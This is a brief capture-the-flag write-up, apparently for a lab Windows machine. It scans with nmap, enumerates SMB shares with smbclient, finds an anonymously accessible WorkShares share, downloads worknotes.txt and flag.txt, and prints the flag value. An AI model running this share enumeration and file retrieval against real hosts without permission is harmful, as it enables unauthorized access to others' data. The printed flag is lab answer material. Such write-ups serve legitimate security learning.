```php
nmap -A -p- -sC 10.129.148.211

Nmap scan report for 10.129.148.211
Host is up (0.038s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

There interested in port 445 for SMB related attacks

use `smbclient` to list out possible open shares on port 445 

```php
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk 
```

Lets go down the list trying them out

```php
smbclient \\\\10.129.148.211\\ADMIN$ -N
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient \\\\10.129.148.211\\C$ -N
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient \\\\10.129.148.211\\IPC -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

The `WorkShares` directory was free

```php
smbclient \\\\10.129.148.211\\WorkShares

Password for [WORKGROUP\drew]:
Try "help" to get a list of possible commands.
smb: \> help
```

We see two directories `Amy.J` and `James.P`, using the `get` command and grab the text file that each one contained, `worknotes.txt` and `flag.txt`.

```php
get worknotes.txt 
get flag.txt 
```

In `flag.txt` we find the root flag: `5f61c10dffbc77a704d76016a22f1664`
We have rooted this machine